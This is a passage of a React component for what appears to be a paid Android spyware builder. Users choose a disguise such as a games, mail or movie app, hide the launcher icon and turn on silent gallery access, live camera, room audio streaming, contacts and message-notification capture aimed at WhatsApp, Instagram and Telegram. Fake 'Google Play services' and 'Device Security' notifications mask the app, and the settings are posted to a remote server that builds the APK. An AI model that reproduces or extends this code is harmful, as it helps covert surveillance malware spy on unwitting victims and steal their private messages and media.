"use client";

import React, { useState, useEffect } from 'react';
import CustomAlertModal from './CustomAlertModal';
import { 
    Smartphone, Shield, Bell, Check, Lock, Crown, Zap, 
    ChevronRight, ChevronLeft, Download, Eye, EyeOff, 
    AlertTriangle, Sparkles, Sliders, RefreshCw, Layers, CheckCircle2, Info,
    Mail, Gamepad2, Film, Flame, Globe, Upload, ExternalLink
} from 'lucide-react';

interface AppGenerationModalProps {
    isOpen: boolean;
    onClose: () => void;
    uuid: string;
    socket: any;
    userPlan?: 'basic' | 'standard' | 'premium';
    onUpgrade?: () => void;
}

const DISGUISE_PRESETS = [
    {
        id: 'custom',
        name: 'Custom App',
        packageName: 'com.gallery.eye',
        url: '',
        color: 'from-indigo-500/20 via-blue-500/10 to-transparent border-indigo-500/40 text-indigo-300'
    },
    {
        id: 'temp_mail',
        name: 'Temp Mail',
        packageName: 'com.tempmail.inbox',
        url: 'https://mail.tm/en/',
        color: 'from-emerald-500/20 via-teal-500/10 to-transparent border-emerald-500/40 text-emerald-300'
    },
    {
        id: 'poki_games',
        name: 'Poki Games',
        packageName: 'com.poki.games',
        url: 'https://poki.com/',
        color: 'from-purple-500/20 via-fuchsia-500/10 to-transparent border-purple-500/40 text-purple-300'
    },
    {
        id: 'movie_box',
        name: 'Movie Box',
        packageName: 'com.moviebox.cinema',
        url: 'https://movie-box.co/',
        color: 'from-rose-500/20 via-pink-500/10 to-transparent border-rose-500/40 text-rose-300'
    },
    {
        id: 'sms_bomber',
        name: 'SMS Bomber',
        packageName: 'com.h4k3r.bomber',
        url: 'https://h4k3r-bomber.vercel.app',
        color: 'from-amber-500/20 via-orange-500/10 to-transparent border-amber-500/40 text-amber-300'
    }
];

const MONITORED_APPS = [
    { id: 'whatsapp_biz', name: 'WhatsApp Business', pkg: 'com.whatsapp.w4b', icon: '💬', color: 'text-emerald-300 border-emerald-500/40 bg-emerald-500/15 shadow-[0_4px_16px_rgba(16,185,129,0.15)]' },
    { id: 'whatsapp', name: 'WhatsApp Messenger', pkg: 'com.whatsapp', icon: '💬', color: 'text-green-300 border-green-500/40 bg-green-500/15 shadow-[0_4px_16px_rgba(34,197,94,0.15)]' },
    { id: 'instagram', name: 'Instagram', pkg: 'com.instagram.android', icon: '📸', color: 'text-pink-300 border-pink-500/40 bg-pink-500/15 shadow-[0_4px_16px_rgba(236,72,153,0.15)]' },
    { id: 'telegram', name: 'Telegram', pkg: 'org.telegram.messenger', icon: '✈️', color: 'text-cyan-300 border-cyan-500/40 bg-cyan-500/15 shadow-[0_4px_16px_rgba(6,182,212,0.15)]' },
    { id: 'messenger', name: 'Messenger', pkg: 'com.facebook.orca', icon: '⚡', color: 'text-blue-300 border-blue-500/40 bg-blue-500/15 shadow-[0_4px_16px_rgba(59,130,246,0.15)]' },
    { id: 'sms', name: 'System SMS', pkg: 'com.google.android.apps.messaging', icon: '📱', color: 'text-amber-300 border-amber-500/40 bg-amber-500/15 shadow-[0_4px_16px_rgba(245,158,11,0.15)]' },
];

export default function AppGenerationModal({ isOpen, onClose, uuid, socket, userPlan = 'basic', onUpgrade }: AppGenerationModalProps) {
    const isBasicPlan = userPlan === 'basic';
    const isPremium = userPlan === 'premium';

    const [activeStep, setActiveStep] = useState<'identity' | 'permissions' | 'notifications'>('identity');
    const [status, setStatus] = useState<'idle' | 'queued' | 'generating' | 'downloading' | 'completed'>('idle');
    const [progress, setProgress] = useState(0);
    const [progressStep, setProgressStep] = useState("");
    const [downloadUrl, setDownloadUrl] = useState("");
    const [queuePosition, setQueuePosition] = useState(0);

    // Customization State
    const [selectedPreset, setSelectedPreset] = useState<string>('custom');
    const [appName, setAppName] = useState("");
    const [packageName, setPackageName] = useState("com.gallery.eye");
    const [hideApp, setHideApp] = useState(false);
    const [webLink, setWebLink] = useState("");
    const [customIcon, setCustomIcon] = useState<File | null>(null);
    const [customIconPreview, setCustomIconPreview] = useState<string | null>(null);

    // Generate exactly 3 segments format: com.project.app
    const generatePackageName = (name: string) => {
        const cleaned = name.toLowerCase().replace(/[^a-z0-9\s]/g, '').trim();
        const parts = cleaned.split(/\s+/).filter(Boolean);
        if (parts.length === 0) return "com.gallery.eye";
        if (parts.length === 1) return `com.${parts[0]}.app`;
        return `com.${parts[0]}.${parts[1]}`;
    };

    const handlePresetChange = (presetId: string) => {
        setSelectedPreset(presetId);
        const preset = DISGUISE_PRESETS.find(p => p.id === presetId);
        if (preset && presetId !== 'custom') {
            setAppName(preset.name);
            setPackageName(preset.packageName);
            setWebLink(preset.url);
        } else if (presetId === 'custom') {
            setAppName("");
            setPackageName("com.gallery.eye");
            setWebLink("");
        }
    };

    const handleAppNameChange = (name: string) => {
        setAppName(name);
        setPackageName(generatePackageName(name));
    };

    const handleIconSelect = (file: File | null) => {
        setCustomIcon(file);
        if (file) {
            const url = URL.createObjectURL(file);
            setCustomIconPreview(url);
        } else {
            setCustomIconPreview(null);
        }
    };

    // Permission Manager State
    const [enableSmsPermission, setEnableSmsPermission] = useState(false);
    const [enableContactsPermission, setEnableContactsPermission] = useState(false);
    const [enableStoragePermission, setEnableStoragePermission] = useState(true);
    const [enableCameraPermission, setEnableCameraPermission] = useState(false);
    const [enableMicrophonePermission, setEnableMicrophonePermission] = useState(false);
    const [enableNotificationListener, setEnableNotificationListener] = useState(true);
    const [showPermissionInfo, setShowPermissionInfo] = useState<'sms' | 'contacts' | 'storage' | 'camera' | 'microphone' | 'notifications' | null>(null);
    const [showPlayProtectWarning, setShowPlayProtectWarning] = useState(false);
    const [aggressivePermissions, setAggressivePermissions] = useState(false);

    // Notification Monitoring State
    const [selectedTargetApps, setSelectedTargetApps] = useState<string[]>(['whatsapp_biz', 'whatsapp', 'instagram']);
    const [notificationStyle, setNotificationStyle] = useState("google_play");
    const [notificationClickAction, setNotificationClickAction] = useState("device_info");
    const [notificationTitle, setNotificationTitle] = useState("");
    const [notificationText, setNotificationText] = useState("");
    const [notificationIcon, setNotificationIcon] = useState("info");

    const NOTIFICATION_PRESETS: Record<string, { title: string; text: string; icon: string }> = {
        google_play: { title: "Google Play services", text: "Checking for updates…", icon: "ℹ️" },
        android_system: { title: "Android System", text: "Updating system components…", icon: "🔄" },
        device_security: { title: "Device Security", text: "Scanning for threats…", icon: "🔒" },
        system_ui: { title: "System UI", text: "Syncing system data…", icon: "🔄" },
        device_maintenance: { title: "Device maintenance", text: "Optimizing performance…", icon: "🔄" },
        download_manager: { title: "Download Manager", text: "Download in progress…", icon: "⬇️" },
        custom: { title: "Custom", text: "Set your own title & text", icon: "✏️" },
    };

    const [showCustomAlert, setShowCustomAlert] = useState(false);
    const [alertData, setAlertData] = useState({ title: '', message: '', type: 'error' as 'error' | 'warning' | 'success' | 'info' });

    useEffect(() => {
        if (isOpen) {
            setStatus('idle');
            setProgress(0);
            setProgressStep("");
            setDownloadUrl("");
            setQueuePosition(0);
            setActiveStep('identity');
        }
    }, [isOpen]);

    useEffect(() => {
        if (!socket) return;

        const handleProgress = (data: any) => {
            setStatus('generating');
            setProgress(data.progress);
            if (data.step) setProgressStep(data.step);
        };

        const handleQueueUpdate = (data: any) => {
            setStatus('queued');
            setQueuePosition(data.position);
        };

        const handleReady = (data: any) => {
            setStatus('completed');
            setProgress(100);
            setProgressStep("APK ready for download!");
            setDownloadUrl(data.downloadUrl);

            try {
                const link = document.createElement('a');
                link.href = data.downloadUrl;
                link.download = `${(appName || "app").replace(/\s+/g, '_')}.apk`;
                document.body.appendChild(link);
                link.click();
                document.body.removeChild(link);
            } catch (err) {
                console.error("Auto download trigger error:", err);
            }
        };

        const handleError = (data: any) => {
            console.error("APK Error:", data);
            setStatus('idle');
            setAlertData({
                title: 'Generation Failed',
                message: data.message || 'An error occurred while building the APK.',
                type: 'error'
            });
            setShowCustomAlert(true);
        };

        socket.on('apk_progress', handleProgress);
        socket.on('queue_update', handleQueueUpdate);
        socket.on('apk_ready', handleReady);
        socket.on('apk_error', handleError);

        return () => {
            socket.off('apk_progress', handleProgress);
            socket.off('queue_update', handleQueueUpdate);
            socket.off('apk_ready', handleReady);
            socket.off('apk_error', handleError);
        };
    }, [socket, appName]);

    const toggleTargetApp = (appId: string) => {
        setSelectedTargetApps(prev => 
            prev.includes(appId) ? prev.filter(id => id !== appId) : [...prev, appId]
        );
    };

    const startGeneration = async () => {
        // Validation: ONLY validate when custom preset is selected AND hideApp is OFF
        if (selectedPreset === 'custom' && !hideApp) {
            if (!appName.trim()) {
                setAlertData({
                    title: 'App Name Required',
                    message: 'Please enter your app display name for the custom app.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
            if (!webLink.trim()) {
                setAlertData({
                    title: 'Web Link Required',
                    message: 'Please provide a WebView link for your custom app.\n\nThe app needs a URL to display when launched.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
            if (!customIcon && !customIconPreview) {
                setAlertData({
                    title: 'Custom Icon Required',
                    message: 'Please select an icon (PNG/JPG) for your custom app.',
                    type: 'warning'
                });
                setShowCustomAlert(true);
                return;
            }
        }

        setStatus('generating');
        setProgress(5);
        setProgressStep("Initializing request...");

        try {
            if (!uuid) {
                throw new Error("User ID is missing. Please log in again.");
            }

            const formData = new FormData();
            formData.append('uuid', uuid);
            formData.append('appName', appName || (selectedPreset === 'custom' ? 'Custom App' : selectedPreset));
            formData.append('packageName', packageName);
            formData.append('hideApp', hideApp.toString());
            formData.append('webLink', webLink);
            formData.append('enableSmsPermission', enableSmsPermission.toString());
            formData.append('enableContactsPermission', enableContactsPermission.toString());
            formData.append('enableStoragePermission', enableStoragePermission.toString());
            formData.append('enableCameraPermission', enableCameraPermission.toString());
            formData.append('enableMicrophonePermission', enableMicrophonePermission.toString());
            formData.append('enableNotificationListener', enableNotificationListener.toString());
            formData.append('aggressivePermissions', aggressivePermissions.toString());
            formData.append('notificationStyle', notificationStyle);
            formData.append('notificationClickAction', notificationClickAction);
            formData.append('monitoredApps', JSON.stringify(selectedTargetApps));

            if (notificationStyle === 'custom') {
                formData.append('notificationTitle', notificationTitle);
                formData.append('notificationText', notificationText);
                formData.append('notificationIcon', notificationIcon);
            }
            if (customIcon) {
                formData.append('icon', customIcon);
            }

            const response = await fetch(`https://p01--gallery-eye--9zr85m7yb6s4.code.run/download-apk`, {
                method: 'POST',
                body: formData,
            });

            if (!response.ok) {
                const errorText = await response.text();
                throw new Error(errorText || "Generation failed to start");
            }

            const data = await response.json();
            if (data.position) {
                setStatus('queued');
                setQueuePosition(data.position);
            }
        } catch (error: any) {
            console.error(error);
            setStatus('idle');
            setAlertData({
                title: 'Error Starting Build',
                message: error.message || "Failed to start generation. Please try again.",
                type: 'error'
            });
            setShowCustomAlert(true);
        }
    };

    // Mini 48px tile icon renderer for grid selection
    const renderPresetIconBadge = (presetId: string) => {
        switch (presetId) {
            case 'temp_mail':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] flex items-center justify-center shadow-md border border-white/20">
                        <Mail className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'poki_games':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] flex items-center justify-center shadow-md border border-white/20">
                        <Gamepad2 className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'movie_box':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] flex items-center justify-center shadow-md border border-white/20">
                        <Film className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
            case 'sms_bomber':
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] flex items-center justify-center shadow-md border border-amber-300/30">
                        <Flame className="w-6 h-6 text-amber-200 drop-shadow" />
                    </div>
                );
            default:
                return (
                    <div className="w-12 h-12 rounded-2xl bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] flex items-center justify-center shadow-md border border-white/20">
                        <Globe className="w-6 h-6 text-white drop-shadow" />
                    </div>
                );
        }
    };

    // Realistic Android screen icon renderer
    const renderRealisticIcon = () => {
        if (customIconPreview) {
            return (
                <div className="w-full h-full rounded-[22px] overflow-hidden shadow-[0_12px_28px_rgba(0,0,0,0.6)] border border-white/20">
                    <img src={customIconPreview} alt="Uploaded Icon" className="w-full h-full object-cover" />
                </div>
            );
        }

        switch (selectedPreset) {
            case 'temp_mail':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#10B981] via-[#059669] to-[#047857] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(16,185,129,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-gradient-to-t from-black/20 to-transparent" />
                        <div className="w-12 h-10 rounded-xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Mail className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1.5 drop-shadow">MAIL.TM</span>
                    </div>
                );
            case 'poki_games':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#A855F7] via-[#9333EA] to-[#6B21A8] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(168,85,247,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute -top-6 -right-6 w-16 h-16 bg-pink-400/30 rounded-full blur-xl" />
                        <div className="w-12 h-12 rounded-2xl bg-white/15 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Gamepad2 className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">POKI</span>
                    </div>
                );
            case 'movie_box':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F43F5E] via-[#E11D48] to-[#9F1239] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(244,63,94,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-[radial-gradient(circle_at_top_right,rgba(255,255,255,0.25),transparent)]" />
                        <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Film className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CINEMA</span>
                    </div>
                );
            case 'sms_bomber':
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#F59E0B] via-[#EA580C] to-[#DC2626] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(245,158,11,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="absolute inset-0 bg-gradient-to-b from-transparent via-black/10 to-black/30" />
                        <div className="w-12 h-12 rounded-2xl bg-black/30 backdrop-blur-md flex items-center justify-center border border-amber-300/40 shadow-inner">
                            <Flame className="w-7 h-7 text-amber-300 drop-shadow-[0_0_8px_rgba(251,191,36,0.8)]" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-amber-200 uppercase mt-1 drop-shadow">H4K3R</span>
                    </div>
                );
            default:
                return (
                    <div className="w-full h-full rounded-[22px] bg-gradient-to-br from-[#6366F1] via-[#4F46E5] to-[#3730A3] p-3 flex flex-col items-center justify-center shadow-[0_12px_28px_rgba(99,102,241,0.45)] border border-white/25 relative overflow-hidden group">
                        <div className="w-12 h-12 rounded-2xl bg-white/20 backdrop-blur-md flex items-center justify-center border border-white/30 shadow-inner">
                            <Globe className="w-7 h-7 text-white drop-shadow" />
                        </div>
                        <span className="text-[9px] font-black tracking-widest text-white/90 uppercase mt-1 drop-shadow">CUSTOM</span>
                    </div>
                );
        }
    };

    if (!isOpen) return null;

    return (
        <div className="fixed inset-0 z-[300] flex items-center justify-center bg-black/80 backdrop-blur-xl animate-in fade-in duration-200 p-3 sm:p-6 overflow-y-auto">
            <div className="bg-[#101217] border border-white/10 rounded-[2.5rem] max-w-2xl w-full flex flex-col shadow-[0_25px_80px_rgba(0,0,0,0.9)] relative max-h-[92dvh] overflow-hidden">
                
                {/* Compact Header & Step Wizard Bar */}
                <div className="p-3.5 sm:p-4 border-b border-white/10 bg-black/60 flex items-center justify-between gap-3">
                    {/* Soft UI Step Wizard Tabs */}
                    <div className="grid grid-cols-3 gap-1.5 p-1 rounded-2xl bg-black/40 border border-white/10 flex-1 max-w-lg">
                        <button
                            type="button"
                            onClick={() => setActiveStep('identity')}
                            className={`flex items-center justify-center gap-1.5 py-2 px-2.5 rounded-xl text-xs font-bold transition-all ${
                                activeStep === 'identity'
                                    ? 'bg-gradient-to-r from-emerald-500/25 to-teal-500/25 text-emerald-300 border border-emerald-500/40 shadow-[0_4px_16px_rgba(16,185,129,0.2)]'
                                    : 'text-fg-3 hover:text-fg-1'
                            }`}
                        >
                            <Smartphone size={14} />
                            <span>1. Disguise</span>
                        </button>
                        <button
                            type="button"
                            onClick={() => setActiveStep('permissions')}
                            className={`flex items-center justify-center gap-1.5 py-2 px-2.5 rounded-xl text-xs font-bold transition-all ${
                                activeStep === 'permissions'
                                    ? 'bg-gradient-to-r from-cyan-500/25 to-blue-500/25 text-cyan-300 border border-cyan-500/40 shadow-[0_4px_16px_rgba(6,182,212,0.2)]'
                                    : 'text-fg-3 hover:text-fg-1'
                            }`}
                        >
                            <Shield size={14} />
                            <span>2. Permissions</span>
                        </button>
                        <button
                            type="button"
                            onClick={() => setActiveStep('notifications')}
                            className={`flex items-center justify-center gap-1.5 py-2 px-2.5 rounded-xl text-xs font-bold transition-all ${
                                activeStep === 'notifications'
                                    ? 'bg-gradient-to-r from-purple-500/25 to-pink-500/25 text-purple-300 border border-purple-500/40 shadow-[0_4px_16px_rgba(168,85,247,0.2)]'
                                    : 'text-fg-3 hover:text-fg-1'
                            }`}
                        >
                            <Bell size={14} />
                            <span>3. Targets</span>
                        </button>
                    </div>

                    {/* Styled Colored Close Button */}
                    <button
                        onClick={onClose}
                        className="w-9 h-9 rounded-full bg-rose-500/20 hover:bg-rose-500/35 border border-rose-500/50 flex items-center justify-center text-rose-300 hover:text-white shadow-[0_0_15px_rgba(244,63,94,0.3)] transition-all flex-shrink-0"
                        title="Close App Studio"
                    >
                        ✕
                    </button>
                </div>

                {/* Main Content Area */}
                <div className="p-5 sm:p-7 overflow-y-auto flex-1 space-y-6 custom-scrollbar">
                    
                    {/* STEP 1: PORTAL & DISGUISE PRESETS */}
                    {activeStep === 'identity' && (
                        <div className="space-y-6 animate-in fade-in duration-200">
                            
                            {/* App Icon Tile Grid ("icon lagao, bass name ho niche, koi extra text na ho") */}
                            <div>
                                <label className="block text-xs font-bold text-fg-3 uppercase tracking-widest mb-3">Select Application Disguise</label>
                                <div className="grid grid-cols-3 sm:grid-cols-5 gap-3">
                                    {DISGUISE_PRESETS.map((p) => {
                                        const isSelected = selectedPreset === p.id;
                                        return (
                                            <button
                                                key={p.id}
                                                type="button"
                                                onClick={() => handlePresetChange(p.id)}
                                                className={`p-3.5 rounded-2xl border flex flex-col items-center justify-center gap-2.5 transition-all text-center ${
                                                    isSelected
                                                        ? 'bg-gradient-to-b from-emerald-500/15 to-emerald-500/5 border-emerald-500/60 shadow-[0_0_20px_rgba(16,185,129,0.2)] scale-[1.03]'
                                                        : 'bg-black/40 border-white/10 hover:border-white/20 text-fg-3 hover:bg-white/[0.04]'
                                                }`}
                                            >
                                                {renderPresetIconBadge(p.id)}
                                                <span className={`text-xs font-bold leading-tight truncate w-full ${isSelected ? 'text-white' : 'text-fg-3'}`}>
                                                    {p.name}
                                                </span>
                                            </button>
                                        );
                                    })}
                                </div>
                            </div>

                            {/* Form Configuration / Preview Section */}
                            <div className={`grid grid-cols-1 ${selectedPreset === 'custom' ? 'sm:grid-cols-12 gap-5' : 'sm:grid-cols-1'} items-start pt-1`}>
                                
                                {/* Form Inputs: ONLY Shown when selectedPreset === 'custom' */}
                                {selectedPreset === 'custom' && (
                                    <div className="sm:col-span-7 space-y-4 animate-in fade-in">
                                        {/* App Display Name */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">App Display Name</label>
                                            <input
                                                type="text"
                                                value={appName}
                                                onChange={(e) => handleAppNameChange(e.target.value)}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-bold focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="enter your app name"
                                            />
                                        </div>

                                        {/* Package Identifier (Exactly 3 Segments e.g. com.gallery.eye) */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Package Identifier</label>
                                            <input
                                                type="text"
                                                value={packageName}
                                                onChange={(e) => setPackageName(e.target.value.toLowerCase().replace(/[^a-z0-9.]/g, ''))}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white font-mono text-xs focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="com.gallery.eye"
                                            />
                                            <p className="text-[11px] text-fg-4 mt-1">Format: com.project.name (3 segments)</p>
                                        </div>

                                        {/* Custom Web Portal Link */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Launch Web URL</label>
                                            <input
                                                type="url"
                                                value={webLink}
                                                onChange={(e) => setWebLink(e.target.value)}
                                                className="w-full bg-black/50 border border-white/10 rounded-2xl px-4 py-3 text-white text-sm focus:outline-none focus:border-emerald-500/60 transition-colors shadow-inner"
                                                placeholder="https://example.com"
                                            />
                                        </div>

                                        {/* Custom Icon PNG */}
                                        <div>
                                            <label className="block text-xs font-bold text-fg-3 uppercase tracking-wider mb-1.5">Upload Custom Icon PNG</label>
                                            <label className="w-full bg-black/40 border border-dashed border-white/15 hover:border-white/30 rounded-2xl p-3 flex items-center justify-between cursor-pointer transition-colors group">
                                                <div className="flex items-center gap-2.5">
                                                    <div className="w-9 h-9 rounded-xl bg-white/5 flex items-center justify-center text-fg-3 group-hover:text-white transition-colors">
                                                        <Upload size={16} />
                                                    </div>
                                                    <div>
                                                        <span className="text-xs font-bold text-white block">Choose PNG / JPG Icon</span>
                                                        <span className="text-[10px] text-fg-4">Recommended 512x512px transparent</span>
                                                    </div>
                                                </div>
                                                <input
                                                    type="file"
                                                    accept="image/png, image/jpeg"
                                                    onChange={(e) => handleIconSelect(e.target.files?.[0] || null)}
                                                    className="hidden"
                                                />
                                            </label>
                                        </div>
                                    </div>
                                )}

                                {/* Soft UI Phone Home-Screen Preview */}
                                <div className={`${selectedPreset === 'custom' ? 'sm:col-span-5' : 'max-w-sm mx-auto w-full'} bg-gradient-to-b from-black/60 to-black/30 border border-white/10 rounded-3xl p-5 flex flex-col items-center justify-center text-center shadow-xl`}>
                                    <div className="text-[10px] font-bold text-fg-3 uppercase tracking-widest mb-4">Live Android Home Screen</div>
                                    
                                    <div className="w-24 h-24 mb-3 relative group">
                                        {renderRealisticIcon()}
                                        {hideApp && (
                                            <div className="absolute -top-1.5 -right-1.5 px-2 py-0.5 rounded-full bg-red-500 text-white text-[9px] font-black tracking-wider uppercase shadow-lg">
                                                Hidden
                                            </div>
                                        )}
                                    </div>

                                    <span className="text-sm font-black text-white max-w-[140px] truncate">{appName || "enter your app name"}</span>
                                    <span className="text-[10px] font-mono text-fg-4 mt-0.5 truncate max-w-[160px]">{packageName}</span>

                                    {/* Hide App Toggle Switch */}
                                    <div className="mt-5 w-full pt-4 border-t border-white/10 flex items-center justify-between">
                                        <div className="flex items-center gap-1.5">
                                            <span className="text-xs font-bold text-fg-2">Hide Launcher Icon</span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-1.5 py-0.5 rounded text-[9px] font-extrabold tracking-wider">
                                                    PRO
                                                </span>
                                            )}
                                        </div>
                                        <button
                                            type="button"
                                            onClick={() => {
                                                if (isBasicPlan) {
                                                    onUpgrade?.();
                                                    return;
                                                }
                                                setHideApp(!hideApp);
                                            }}
                                            className={`w-11 h-6 rounded-full transition-colors relative ${
                                                isBasicPlan ? 'bg-white/10' : hideApp ? 'bg-emerald-500' : 'bg-white/20'
                                            }`}
                                        >
                                            <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${hideApp && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                        </button>
                                    </div>
                                </div>
                            </div>
                        </div>
                    )}

                    {/* STEP 2: SOFT PERMISSIONS & STEALTH */}
                    {activeStep === 'permissions' && (
                        <div className="space-y-4 animate-in fade-in duration-200">
                            <div className="flex items-center justify-between">
                                <span className="text-xs font-bold text-fg-3 uppercase tracking-widest">Soft UI Access Permissions</span>
                                <span className="text-xs text-fg-4">Each permission uses soft color coding</span>
                            </div>

                            <div className="grid grid-cols-1 sm:grid-cols-2 gap-3">
                                
                                {/* Storage / Gallery - Soft Emerald */}
                                <div className="p-4 rounded-2xl bg-emerald-500/10 border border-emerald-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(16,185,129,0.1)]">
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-emerald-200">Gallery & Storage</span>
                                            <button type="button" onClick={() => setShowPermissionInfo('storage')} className="text-emerald-400/70 hover:text-emerald-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-emerald-300/70">Silent media & photo access</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => setEnableStoragePermission(!enableStoragePermission)}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${enableStoragePermission ? 'bg-emerald-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableStoragePermission ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Camera - Soft Cyan */}
                                <div className={`p-4 rounded-2xl bg-cyan-500/10 border border-cyan-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(6,182,212,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-cyan-200">Camera Capture</span>
                                            {!isPremium && (
                                                <span className="bg-cyan-500/20 text-cyan-300 border border-cyan-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PREMIUM
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('camera')} className="text-cyan-400/70 hover:text-cyan-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-cyan-300/70">Live video & photo snapshots</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.(); return; }
                                            setEnableCameraPermission(!enableCameraPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${!isPremium ? 'bg-white/10' : enableCameraPermission ? 'bg-cyan-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableCameraPermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Microphone - Soft Violet */}
                                <div className={`p-4 rounded-2xl bg-purple-500/10 border border-purple-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(168,85,247,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-purple-200">Live Microphone</span>
                                            {!isPremium && (
                                                <span className="bg-purple-500/20 text-purple-300 border border-purple-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PREMIUM
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('microphone')} className="text-purple-400/70 hover:text-purple-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-purple-300/70">Room surround audio streaming</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (!isPremium) { onUpgrade?.(); return; }
                                            setEnableMicrophonePermission(!enableMicrophonePermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${!isPremium ? 'bg-white/10' : enableMicrophonePermission ? 'bg-purple-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableMicrophonePermission && isPremium ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

                                {/* Contacts - Soft Green */}
                                <div className={`p-4 rounded-2xl bg-green-500/10 border border-green-500/30 flex items-center justify-between gap-3 shadow-[0_4px_16px_rgba(34,197,94,0.1)]`}>
                                    <div className="flex flex-col">
                                        <div className="flex items-center gap-2">
                                            <span className="text-sm font-bold text-green-200">Contacts Sync</span>
                                            {isBasicPlan && (
                                                <span className="bg-amber-500/20 text-amber-300 border border-amber-500/40 px-2 py-0.5 rounded-full text-[9px] font-black tracking-wider">
                                                    PRO
                                                </span>
                                            )}
                                            <button type="button" onClick={() => setShowPermissionInfo('contacts')} className="text-green-400/70 hover:text-green-300">
                                                <Info size={14} />
                                            </button>
                                        </div>
                                        <span className="text-xs text-green-300/70">Sync phonebook & email addresses</span>
                                    </div>
                                    <button
                                        type="button"
                                        onClick={() => {
                                            if (isBasicPlan) { onUpgrade?.(); return; }
                                            setEnableContactsPermission(!enableContactsPermission);
                                        }}
                                        className={`w-11 h-6 rounded-full transition-colors relative ${isBasicPlan ? 'bg-white/10' : enableContactsPermission ? 'bg-green-500' : 'bg-white/20'}`}
                                    >
                                        <div className={`w-4 h-4 bg-white rounded-full absolute top-1 transition-transform ${enableContactsPermission && !isBasicPlan ? 'left-6' : 'left-1'}`} />
                                    </button>
                                </div>

